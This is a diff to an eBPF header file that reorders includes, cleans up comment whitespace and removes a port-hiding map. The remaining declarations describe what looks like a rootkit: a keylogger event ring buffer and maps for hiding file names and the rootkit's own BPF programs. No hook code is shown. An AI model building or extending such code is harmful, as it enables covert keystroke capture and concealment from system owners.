@@ -1,9 +1,9 @@
 #ifndef __MAPS_H
 #define __MAPS_H
 
-#include <vmlinux.h>
-#include <bpf/bpf_helpers.h>
 #include "config.h"
+#include <bpf/bpf_helpers.h>
+#include <vmlinux.h>
 
 #define CONFIG_MAP_MAX_ENTRIES 10
 #define EVENTS_MAP_MAX_ENTRIES 256 * 1024
@@ -17,7 +17,7 @@ enum config_keys {
 
 /**
  * @brief Global configuration map
- * 
+ *
  */
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
@@ -28,7 +28,7 @@ struct {
 
 /**
  * @brief Shared ring buffer to send telemetry back to userspace
- * 
+ *
  * Key: u32 Key
  * Value: u32 Value
  */
@@ -39,7 +39,7 @@ struct {
 
 /**
  * @brief Shared ring buffer to send keylogger events back to userspace
- * 
+ *
  */
 struct {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
@@ -48,10 +48,10 @@ struct {
 
 /**
  * @brief Map to store target file names to hide.
- * 
+ *
  * Key: char[] filename
  * Value: u8 Flag (1 = hidden)
- * 
+ *
  */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
@@ -61,23 +61,8 @@ struct {
 } hide_names_map SEC(".maps");
 
 /**
- * @brief Map to store target ports to hide
- * 
- * Key: u16 Port
- * Value: u8 Flag (1 = hidden)
- * 
- */
-struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, HIDE_PORTS_MAP_MAX_ENTRIES);
-    __type(key, u16);
-    __type(value, u8);
-} hide_ports_map SEC(".maps");
-
-
-/**
  * @brief Map holding IDs of BPF programs/maps to hide
- * 
+ *
  * Key: u32 BPF ID (prog_id or map_id)
  * Value: u8 Flag (1 = hidden)
  *
